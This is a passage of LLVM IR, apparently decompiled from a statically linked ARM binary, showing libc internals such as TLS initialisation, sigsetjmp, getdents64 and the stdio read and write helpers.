  %v5_18088 = phi i32 [ %arg1, %dec_label_pc_18084 ], [ %v4_18088, %bb ]
  ret i32 %v5_18088

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_18094 = add i32 %arg1, 40
  store i32 %v1_18094, i32* %r2.global-to-local, align 4
  %v1_18098 = inttoptr i32 %v1_18094 to i32*
  %v2_18098 = load i32, i32* %v1_18098, align 4
  store i32 %v2_18098, i32* %r2.global-to-local, align 4
  %v3_18098 = add i32 %arg1, 44
  %v4_18098 = inttoptr i32 %v3_18098 to i32*
  %v5_18098 = load i32, i32* %v4_18098, align 4
  store i32 %v5_18098, i32* %r3.global-to-local, align 4
  %v0_1809c = call i32 @__aeabi_read_tp()
  %v1_180a0 = inttoptr i32 %v0_1809c to i32*
  %v2_180a0 = load i32, i32* %v1_180a0, align 4
  store i32 %v2_180a0, i32* %r1.global-to-local, align 4
  %v3_180a4 = mul i32 %v5_18098, 8
  store i32 %v3_180a4, i32* %r3.global-to-local, align 4
  %v1_180a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_180a8 = add i32 %v1_180a8, %v0_1809c
  %v3_180ac = add i32 %v3_180a4, %v2_180a0
  %v4_180ac = inttoptr i32 %v3_180ac to i32*
  store i32 %v2_180a8, i32* %v4_180ac, align 4
  %v0_180b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_180b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_180b0 = add i32 %v1_180b0, %v0_180b0
  store i32 %v2_180b0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_180b8 = add i32 %v2_180b0, 4
  %v5_180b8 = inttoptr i32 %v4_180b8 to i8*
  store i8 1, i8* %v5_180b8, align 1
  %v0_180bc = load i32, i32* @r4, align 4
  %v1_180bc = add i32 %v0_180bc, 20
  store i32 %v1_180bc, i32* %r1.global-to-local, align 4
  %v1_180c0 = inttoptr i32 %v1_180bc to i32*
  %v2_180c0 = load i32, i32* %v1_180c0, align 4
  store i32 %v2_180c0, i32* @r1, align 4
  %v3_180c0 = add i32 %v0_180bc, 24
  %v4_180c0 = inttoptr i32 %v3_180c0 to i32*
  %v5_180c0 = load i32, i32* %v4_180c0, align 4
  store i32 %v5_180c0, i32* %r2.global-to-local, align 4
  %v5_180c4 = call i32 @__GI_mempcpy(i32 %v2_180a8, i32 %v2_180c0, i32 %v5_180c0, i32 1)
  %v0_180c8 = load i32, i32* @r4, align 4
  %v1_180c8 = add i32 %v0_180c8, 28
  store i32 %v1_180c8, i32* %r3.global-to-local, align 4
  %v1_180cc = inttoptr i32 %v1_180c8 to i32*
  %v2_180cc = load i32, i32* %v1_180cc, align 4
  store i32 %v2_180cc, i32* %r2.global-to-local, align 4
  %v3_180cc = add i32 %v0_180c8, 24
  %v4_180cc = inttoptr i32 %v3_180cc to i32*
  %v5_180cc = load i32, i32* %v4_180cc, align 4
  store i32 %v5_180cc, i32* %r3.global-to-local, align 4
  %v2_180d0 = sub i32 %v5_180cc, %v2_180cc
  store i32 %v2_180d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_180d8 = inttoptr i32 %v5_180c4 to i8*
  %v4_180d8 = call i32 @__GI_memset(i8* %v3_180d8, i32 0, i32 %v2_180d0)
  ret i32 %v4_180d8

; uselistorder directives
  uselistorder i32 %v3_180a4, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_18128:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_1813c = load i32, i32* @r0, align 4
  %v1_18140 = inttoptr i32 %v0_1813c to i32*
  %v2_18140 = load i32, i32* @r4, align 4
  store i32 %v2_18140, i32* %v1_18140, align 4
  %v3_18140 = add i32 %v0_1813c, 4
  %v4_18140 = inttoptr i32 %v3_18140 to i32*
  %v5_18140 = load i32, i32* @r5, align 4
  store i32 %v5_18140, i32* %v4_18140, align 4
  %v6_18140 = add i32 %v0_1813c, 8
  %v7_18140 = inttoptr i32 %v6_18140 to i32*
  %v8_18140 = load i32, i32* @r6, align 4
  store i32 %v8_18140, i32* %v7_18140, align 4
  %v9_18140 = add i32 %v0_1813c, 12
  %v10_18140 = inttoptr i32 %v9_18140 to i32*
  %v11_18140 = load i32, i32* @r7, align 4
  store i32 %v11_18140, i32* %v10_18140, align 4
  %v12_18140 = add i32 %v0_1813c, 16
  %v13_18140 = inttoptr i32 %v12_18140 to i32*
  %v14_18140 = load i32, i32* @r8, align 4
  store i32 %v14_18140, i32* %v13_18140, align 4
  %v15_18140 = add i32 %v0_1813c, 20
  %v16_18140 = inttoptr i32 %v15_18140 to i32*
  %v17_18140 = load i32, i32* @sb, align 4
  store i32 %v17_18140, i32* %v16_18140, align 4
  %v18_18140 = add i32 %v0_1813c, 24
  %v19_18140 = inttoptr i32 %v18_18140 to i32*
  %v20_18140 = load i32, i32* @sl, align 4
  store i32 %v20_18140, i32* %v19_18140, align 4
  %v21_18140 = add i32 %v0_1813c, 28
  %v22_18140 = inttoptr i32 %v21_18140 to i32*
  %v23_18140 = load i32, i32* @fp, align 4
  store i32 %v23_18140, i32* %v22_18140, align 4
  %v24_18140 = add i32 %v0_1813c, 32
  %v25_18140 = inttoptr i32 %v24_18140 to i32*
  %v27_18140 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_18140, i32* %v25_18140, align 4
  %v28_18140 = add i32 %v0_1813c, 36
  %v29_18140 = inttoptr i32 %v28_18140 to i32*
  %v30_18140 = load i32, i32* @lr, align 4
  store i32 %v30_18140, i32* %v29_18140, align 4
  %v0_18144 = call i32 @__sigjmp_save()
  ret i32 %v0_18144

; uselistorder directives
  uselistorder i32 %v0_1813c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 110, 111, 14, 15, 16, 17, 18, 19, 20, 21, 98, 99, 100, 101, 102, 104, 103, 105, 0, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 4, 1, 2, 3, 5, 6, 7, 8, 9, 42, 41, 47, 48, 43, 44, 45, 46, 22, 23, 24, 25, 26, 27, 28, 29, 30, 49, 50, 51, 52, 53, 54, 55, 56, 10, 11, 12, 13, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 70, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 88, 86, 87, 89, 90, 91, 92, 93, 94, 95, 96, 97, 106, 107, 108, 109 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_1814c = load i32, i32* @r5, align 4
  %v12_1814c = load i32, i32* @r7, align 4
  %v1_18150 = add i32 %arg3, 14
  %v2_18158 = ptrtoint i32* %stack_var_-72 to i32
  %v1_1815c = and i32 %v1_18150, -8
  %v2_18160 = sub i32 %v2_18158, %v1_1815c
  %v1_18164 = add i32 %v2_18160, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_181a8, label %dec_label_pc_1818c

dec_label_pc_1818c:                               ; preds = %entry
  %v1_18190 = sub i32 0, %arg1
  %v3_18194 = load i16, i16* @global_var_22294.357, align 2
  %v4_18194 = sext i16 %v3_18194 to i32
  %v0_18198 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_181a0 = add i32 %v4_18194, %v0_18198
  %v4_181a0 = inttoptr i32 %v3_181a0 to i32*
  store i32 %v1_18190, i32* %v4_181a0, align 4
  br label %dec_label_pc_18278

dec_label_pc_181a8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_18278, label %dec_label_pc_181b0

dec_label_pc_181b0:                               ; preds = %dec_label_pc_181a8
  %v2_181b0 = add i32 %v1_18164, %arg1
  store i32 %v2_181b0, i32* %r1.global-to-local, align 4
  %v2_181b4 = add i32 %tmp, %arg3
  store i32 %v1_18164, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18260

dec_label_pc_181d0:                               ; preds = %dec_label_pc_18260
  %v1_181d0 = add i32 %v0_18230, 16
  %v2_181d0 = inttoptr i32 %v1_181d0 to i16*
  %v3_181d0 = load i16, i16* %v2_181d0, align 2
  %v4_181d0 = zext i16 %v3_181d0 to i32
  %v1_181d4 = add nsw i32 %v4_181d0, -19
  store i32 %v1_181d4, i32* @r2, align 4
  %v1_181d8 = add nuw nsw i32 %v4_181d0, 7
  %v1_181dc = and i32 %v1_181d8, 131064
  store i32 %v1_181dc, i32* @ip, align 4
  %v2_181e4 = add i32 %v1_181dc, %v0_18238
  store i32 %v2_181e4, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_181e4, %v2_181b4
  br i1 %tmp24, label %dec_label_pc_181f0, label %dec_label_pc_1822c

dec_label_pc_181f0:                               ; preds = %dec_label_pc_181d0
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_181f8 = load i32, i32* %r8.global-to-local, align 4
  %v0_181fc = load i32, i32* %sb.global-to-local, align 4
  %v1_18200 = load i32, i32* @sp, align 4
  %v2_18200 = inttoptr i32 %v1_18200 to i32*
  store i32 0, i32* %v2_18200, align 4
  %v4_18204 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_181f8, i32 %v0_181fc)
  %v0_18208 = load i32, i32* @r5, align 4
  %v1_18208 = load i32, i32* %sl.global-to-local, align 4
  %v9_18208 = icmp eq i32 %v0_18208, %v1_18208
  br i1 %v9_18208, label %dec_label_pc_18210, label %dec_label_pc_18274

dec_label_pc_18210:                               ; preds = %dec_label_pc_181f0
  %v0_18214 = call i32 @__aeabi_read_tp()
  %v3_18218 = load i16, i16* @global_var_22294.357, align 2
  %v4_18218 = sext i16 %v3_18218 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18224 = add i32 %v4_18218, %v0_18214
  %v4_18224 = inttoptr i32 %v3_18224 to i32*
  store i32 22, i32* %v4_18224, align 4
  br label %dec_label_pc_18278

dec_label_pc_1822c:                               ; preds = %dec_label_pc_181d0
  %v1_1822c = inttoptr i32 %v0_18230 to i32*
  %v2_1822c = load i32, i32* %v1_1822c, align 4
  %v3_1822c = add i32 %v0_18230, 4
  %v4_1822c = inttoptr i32 %v3_1822c to i32*
  %v5_1822c = load i32, i32* %v4_1822c, align 4
  store i32 %v5_1822c, i32* @r4, align 4
  %v1_18230 = add i32 %v0_18230, 8
  store i32 %v1_18230, i32* %r8.global-to-local, align 4
  %v1_18234 = inttoptr i32 %v1_18230 to i32*
  %v2_18234 = load i32, i32* %v1_18234, align 4
  store i32 %v2_18234, i32* %r8.global-to-local, align 4
  %v3_18234 = add i32 %v0_18230, 12
  %v4_18234 = inttoptr i32 %v3_18234 to i32*
  %v5_18234 = load i32, i32* %v4_18234, align 4
  store i32 %v5_18234, i32* %sb.global-to-local, align 4
  %v1_18238 = inttoptr i32 %v0_18238 to i32*
  store i32 %v2_1822c, i32* %v1_18238, align 4
  %v3_18238 = add i32 %v0_18238, 4
  %v4_18238 = inttoptr i32 %v3_18238 to i32*
  %v5_18238 = load i32, i32* @r4, align 4
  store i32 %v5_18238, i32* %v4_18238, align 4
  %v0_1823c = load i32, i32* %r8.global-to-local, align 4
  %v1_1823c = load i32, i32* @r5, align 4
  %v2_1823c = add i32 %v1_1823c, 8
  %v3_1823c = inttoptr i32 %v2_1823c to i32*
  store i32 %v0_1823c, i32* %v3_1823c, align 4
  %v0_18240 = load i32, i32* %sb.global-to-local, align 4
  %v1_18240 = load i32, i32* @r5, align 4
  %v2_18240 = add i32 %v1_18240, 12
  %v3_18240 = inttoptr i32 %v2_18240 to i32*
  store i32 %v0_18240, i32* %v3_18240, align 4
  %v0_18244 = load i32, i32* @ip, align 4
  %v1_18244 = trunc i32 %v0_18244 to i16
  %v2_18244 = load i32, i32* @r5, align 4
  %v3_18244 = add i32 %v2_18244, 16
  %v4_18244 = inttoptr i32 %v3_18244 to i16*
  store i16 %v1_18244, i16* %v4_18244, align 2
  %v0_18248 = load i32, i32* @r7, align 4
  %v1_18248 = add i32 %v0_18248, 18
  %v2_18248 = inttoptr i32 %v1_18248 to i8*
  %v3_18248 = load i8, i8* %v2_18248, align 1
  %v4_18248 = zext i8 %v3_18248 to i32
  store i32 %v4_18248, i32* @r3, align 4
  %v2_1824c = load i32, i32* @r5, align 4
  %v3_1824c = add i32 %v2_1824c, 18
  %v4_1824c = inttoptr i32 %v3_1824c to i8*
  store i8 %v3_18248, i8* %v4_1824c, align 1
  %v0_18250 = call i32 @memcpy()
  %v0_18254 = load i32, i32* @r7, align 4
  %v1_18254 = add i32 %v0_18254, 16
  %v2_18254 = inttoptr i32 %v1_18254 to i16*
  %v3_18254 = load i16, i16* %v2_18254, align 2
  %v4_18254 = zext i16 %v3_18254 to i32
  %v0_18258 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18258, i32* @r5, align 4
  %v2_1825c = add i32 %v4_18254, %v0_18254
  store i32 %v2_1825c, i32* @r7, align 4
  br label %dec_label_pc_18260

dec_label_pc_18260:                               ; preds = %dec_label_pc_181b0, %dec_label_pc_1822c
  %v0_18238 = phi i32 [ %tmp, %dec_label_pc_181b0 ], [ %v0_18258, %dec_label_pc_1822c ]
  %v0_18230 = phi i32 [ %v1_18164, %dec_label_pc_181b0 ], [ %v2_1825c, %dec_label_pc_1822c ]
  %v3_18264 = icmp ult i32 %v0_18230, %v2_181b0
  %v1_18268 = add i32 %v0_18238, 19
  store i32 %v1_18268, i32* @r0, align 4
  %v1_1826c = add i32 %v0_18230, 19
  store i32 %v1_1826c, i32* @r1, align 4
  br i1 %v3_18264, label %dec_label_pc_181d0, label %dec_label_pc_18274.loopexit

dec_label_pc_18274.loopexit:                      ; preds = %dec_label_pc_18260
  %v0_18274.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18274

dec_label_pc_18274:                               ; preds = %dec_label_pc_18274.loopexit, %dec_label_pc_181f0
  %v1_18274 = phi i32 [ %v0_18238, %dec_label_pc_18274.loopexit ], [ %v0_18208, %dec_label_pc_181f0 ]
  %v0_18274 = phi i32 [ %v0_18274.pre, %dec_label_pc_18274.loopexit ], [ %v1_18208, %dec_label_pc_181f0 ]
  %v2_18274 = sub i32 %v1_18274, %v0_18274
  store i32 %v2_18274, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18278

dec_label_pc_18278:                               ; preds = %dec_label_pc_181a8, %dec_label_pc_18210, %dec_label_pc_1818c, %dec_label_pc_18274
  %v0_18278 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_1814c, i32* @r5, align 4
  store i32 %v12_1814c, i32* @r7, align 4
  ret i32 %v0_18278

; uselistorder directives
  uselistorder i32 %v0_18230, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_18238, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_18164, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 7, 8, 0, 3, 9, 10, 11, 4, 5, 6, 1, 12, 2, 13 }
  uselistorder i32 18, { 5, 6, 4, 7, 0, 8, 1, 9, 2, 10, 3, 11 }
  uselistorder i32 22, { 1, 0, 11, 2, 3, 4, 5, 6, 12, 13, 7, 8, 9, 10 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_18278, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18260, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18290 = load i32, i32* @r4, align 4
  store i32 %v3_18290, i32* %stack_var_-12, align 4
  %v0_18294 = load i32, i32* %r0.global-to-local, align 4
  %v1_18294 = inttoptr i32 %v0_18294 to i16*
  %v2_18294 = load i16, i16* %v1_18294, align 2
  %v3_18294 = zext i16 %v2_18294 to i32
  store i32 %v3_18294, i32* @r3, align 4
  %v1_18298 = and i32 %v3_18294, 4
  store i32 %v1_18298, i32* @r5, align 4
  %v2_18298 = icmp eq i32 %v1_18298, 0
  store i32 %v0_18294, i32* @r4, align 4
  br i1 %v2_18298, label %dec_label_pc_182ac, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_182ac:                               ; preds = %entry
  %v1_182ac = icmp slt i32 %arg2, 0
  br i1 %v1_182ac, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_182ac
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_182ac, %bb18
  %v1_182b4 = add i32 %v0_18294, 4
  %v2_182b4 = inttoptr i32 %v1_182b4 to i32*
  %v3_182b4 = load i32, i32* %v2_182b4, align 4
  store i32 %v3_182b4, i32* %r0.global-to-local, align 4
  %v1_182b8 = call i32 @__libc_read(i32 %v3_182b4)
  store i32 %v1_182b8, i32* %r0.global-to-local, align 4
  %v5_182c0 = icmp sgt i32 %v1_182b8, 0
  br i1 %v5_182c0, label %.thread7, label %dec_label_pc_182c4

dec_label_pc_182c4:                               ; preds = %bb19
  %v2_182bc = icmp eq i32 %v1_182b8, 0
  %v0_182c4 = load i32, i32* @r4, align 4
  %v1_182c4 = inttoptr i32 %v0_182c4 to i16*
  %v2_182c4 = load i16, i16* %v1_182c4, align 2
  br i1 %v2_182bc, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_182c4
  %v2_182c8 = or i16 %v2_182c4, 4
  store i16 %v2_182c8, i16* %v1_182c4, align 2
  %v1_182e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_182c4
  %v2_182cc = or i16 %v2_182c4, 8
  store i16 %v2_182cc, i16* %v1_182c4, align 2
  %v1_182d8 = load i32, i32* @r5, align 4
  store i32 %v1_182d8, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_182e4 = phi i32 [ %v1_182e4.pre, %bb20 ], [ 0, %bb ], [ %v1_182b8, %bb19 ], [ %v1_182d8, %bb21 ]
  %v2_182e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_182e0, i32* @r4, align 4
  ret i32 %v1_182e4

; uselistorder directives
  uselistorder i16 %v2_182c4, { 1, 0 }
  uselistorder i32 %v1_182b8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_183ac2 = icmp eq i32 %arg3, 0
  store i1 %v2_183ac2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_183ac2, label %dec_label_pc_183b4, label %dec_label_pc_18304

dec_label_pc_18304:                               ; preds = %entry, %dec_label_pc_183acthread-pre-split.dec_label_pc_18304_crit_edge
  %v0_18310 = phi i32 [ %v0_18310.pre, %dec_label_pc_183acthread-pre-split.dec_label_pc_18304_crit_edge ], [ %tmp, %entry ]
  %v0_1830c = phi i32 [ %v5_1831c, %dec_label_pc_183acthread-pre-split.dec_label_pc_18304_crit_edge ], [ %arg2, %entry ]
  %v3_18304 = phi i32 [ %v3_18304.pre, %dec_label_pc_183acthread-pre-split.dec_label_pc_18304_crit_edge ], [ 2147483647, %entry ]
  %v0_18308.in = phi i32 [ %v5_18320, %dec_label_pc_183acthread-pre-split.dec_label_pc_18304_crit_edge ], [ %arg3, %entry ]
  %v3_18308 = phi i32 [ %v5_18320, %dec_label_pc_183acthread-pre-split.dec_label_pc_18304_crit_edge ], [ %arg3, %entry ]
  %v0_18308 = icmp slt i32 %v0_18308.in, 0
  %storemerge = select i1 %v0_18308, i32 %v3_18304, i32 %v3_18308
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_1830c, i32* %r1.global-to-local, align 4
  %v1_18310 = add i32 %v0_18310, 4
  %v2_18310 = inttoptr i32 %v1_18310 to i32*
  %v3_18310 = load i32, i32* %v2_18310, align 4
  %v3_18314 = call i32 @__GI___libc_write(i32 %v3_18310, i32 %v0_1830c)
  %v1_18318 = icmp slt i32 %v3_18314, 0
  %v2_18318 = icmp eq i32 %v3_18314, 0
  store i1 %v2_18318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18318, label %dec_label_pc_18328, label %dec_label_pc_183acthread-pre-split

dec_label_pc_18328:                               ; preds = %dec_label_pc_18304
  %v0_18328 = load i32, i32* @r4, align 4
  %v1_18328 = inttoptr i32 %v0_18328 to i16*
  %v2_18328 = load i16, i16* %v1_18328, align 2
  %v1_1832c = or i16 %v2_18328, 8
  store i16 %v1_1832c, i16* %v1_18328, align 2
  store i32 40784, i32* %r3.global-to-local, align 4
  %v0_18338 = call i32 @__aeabi_read_tp()
  %v3_1833c = load i16, i16* @global_var_22294.357, align 2
  %v4_1833c = sext i16 %v3_1833c to i32
  store i32 %v4_1833c, i32* %r3.global-to-local, align 4
  %v2_18340 = add i32 %v4_1833c, %v0_18338
  %v3_18340 = inttoptr i32 %v2_18340 to i32*
  %v4_18340 = load i32, i32* %v3_18340, align 4
  store i32 %v4_18340, i32* %r3.global-to-local, align 4
  %v7_18344 = icmp eq i32 %v4_18340, 4
  store i1 %v7_18344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18344, label %dec_label_pc_18350, label %bb21

bb21:                                             ; preds = %dec_label_pc_18328
  %v8_18348 = icmp eq i32 %v4_18340, 11
  store i1 %v8_18348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18348, label %dec_label_pc_18350, label %dec_label_pc_183b4

dec_label_pc_18350:                               ; preds = %dec_label_pc_18328, %bb21
  %v0_18350 = load i32, i32* @r4, align 4
  %v1_18350 = add i32 %v0_18350, 8
  store i32 %v1_18350, i32* %r2.global-to-local, align 4
  %v1_18354 = inttoptr i32 %v1_18350 to i32*
  %v2_18354 = load i32, i32* %v1_18354, align 4
  store i32 %v2_18354, i32* %r2.global-to-local, align 4
  %v3_18354 = add i32 %v0_18350, 12
  %v4_18354 = inttoptr i32 %v3_18354 to i32*
  %v5_18354 = load i32, i32* %v4_18354, align 4
  store i32 %v5_18354, i32* %r3.global-to-local, align 4
  %v2_18358 = sub i32 %v5_18354, %v2_18354
  store i32 %v2_18358, i32* %r1.global-to-local, align 4
  %v9_18358 = icmp eq i32 %v5_18354, %v2_18354
  store i1 %v9_18358, i1* %cpsr_z.global-to-local, align 1
  %v0_183a4.pre = load i32, i32* @r5, align 4
  br i1 %v9_18358, label %dec_label_pc_183a4, label %dec_label_pc_18360

dec_label_pc_18360:                               ; preds = %dec_label_pc_18350
  %v3_18360 = icmp ult i32 %v2_18358, %v0_183a4.pre
  %v9_18360 = icmp eq i32 %v2_18358, %v0_183a4.pre
  store i1 %v9_18360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18360, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_18360
  store i32 %v0_183a4.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_18360, %bb22, %dec_label_pc_18388
  %v2_18374 = phi i32 [ %v1_1838c, %dec_label_pc_18388 ], [ %v2_18354, %bb22 ], [ %v2_18354, %dec_label_pc_18360 ]
  %v0_18368 = load i32, i32* @r6, align 4
  %v1_18368 = inttoptr i32 %v0_18368 to i8*
  %v2_18368 = load i8, i8* %v1_18368, align 1
  %v3_18368 = zext i8 %v2_18368 to i32
  store i32 %v3_18368, i32* %r3.global-to-local, align 4
  %v7_1836c = icmp eq i8 %v2_18368, 10
  store i1 %v7_1836c, i1* %cpsr_z.global-to-local, align 1
  %v1_18370 = add i32 %v0_18368, 1
  store i32 %v1_18370, i32* @r6, align 4
  %v3_18374 = inttoptr i32 %v2_18374 to i8*
  store i8 %v2_18368, i8* %v3_18374, align 1
  %v0_18378 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18378, label %dec_label_pc_1837c, label %dec_label_pc_18388

dec_label_pc_1837c:                               ; preds = %.preheader
  %v0_1837c = load i32, i32* @r4, align 4
  %v1_1837c = inttoptr i32 %v0_1837c to i16*
  %v2_1837c = load i16, i16* %v1_1837c, align 2
  %v3_1837c = zext i16 %v2_1837c to i32
  store i32 %v3_1837c, i32* %r3.global-to-local, align 4
  %v1_18380 = and i32 %v3_1837c, 256
  %v2_18380 = icmp eq i32 %v1_18380, 0
  store i1 %v2_18380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18380, label %dec_label_pc_18388, label %dec_label_pc_1837c.dec_label_pc_18394_crit_edge

dec_label_pc_1837c.dec_label_pc_18394_crit_edge:  ; preds = %dec_label_pc_1837c
  %v0_18398.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18394

dec_label_pc_18388:                               ; preds = %dec_label_pc_1837c, %.preheader
  %v0_18388 = load i32, i32* %r1.global-to-local, align 4
  %v1_18388 = add i32 %v0_18388, -1
  store i32 %v1_18388, i32* %r1.global-to-local, align 4
  %v7_18388 = icmp eq i32 %v0_18388, 1
  store i1 %v7_18388, i1* %cpsr_z.global-to-local, align 1
  %v0_1838c = load i32, i32* %r2.global-to-local, align 4
  %v1_1838c = add i32 %v0_1838c, 1
  store i32 %v1_1838c, i32* %r2.global-to-local, align 4
  br i1 %v7_18388, label %dec_label_pc_18388.dec_label_pc_18394_crit_edge, label %.preheader

dec_label_pc_18388.dec_label_pc_18394_crit_edge:  ; preds = %dec_label_pc_18388
  %v0_18394.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18394

dec_label_pc_18394:                               ; preds = %dec_label_pc_1837c.dec_label_pc_18394_crit_edge, %dec_label_pc_18388.dec_label_pc_18394_crit_edge
  %v0_18398 = phi i32 [ %v1_1838c, %dec_label_pc_18388.dec_label_pc_18394_crit_edge ], [ %v0_18398.pre, %dec_label_pc_1837c.dec_label_pc_18394_crit_edge ]
  %v0_18394 = phi i32 [ %v0_18394.pre, %dec_label_pc_18388.dec_label_pc_18394_crit_edge ], [ %v0_1837c, %dec_label_pc_1837c.dec_label_pc_18394_crit_edge ]
  %v1_18394 = add i32 %v0_18394, 8
  %v2_18394 = inttoptr i32 %v1_18394 to i32*
  %v3_18394 = load i32, i32* %v2_18394, align 4
  store i32 %v3_18394, i32* %r3.global-to-local, align 4
  %v2_18398 = add i32 %v0_18394, 16
  %v3_18398 = inttoptr i32 %v2_18398 to i32*
  store i32 %v0_18398, i32* %v3_18398, align 4
  %v0_1839c = load i32, i32* %r3.global-to-local, align 4
  %v1_1839c = load i32, i32* %r2.global-to-local, align 4
  %v2_1839c = sub i32 %v1_1839c, %v0_1839c
  store i32 %v2_1839c, i32* %r3.global-to-local, align 4
  %v1_183a0 = load i32, i32* @r5, align 4
  %v2_183a0 = sub i32 %v1_183a0, %v2_1839c
  br label %dec_label_pc_183a4

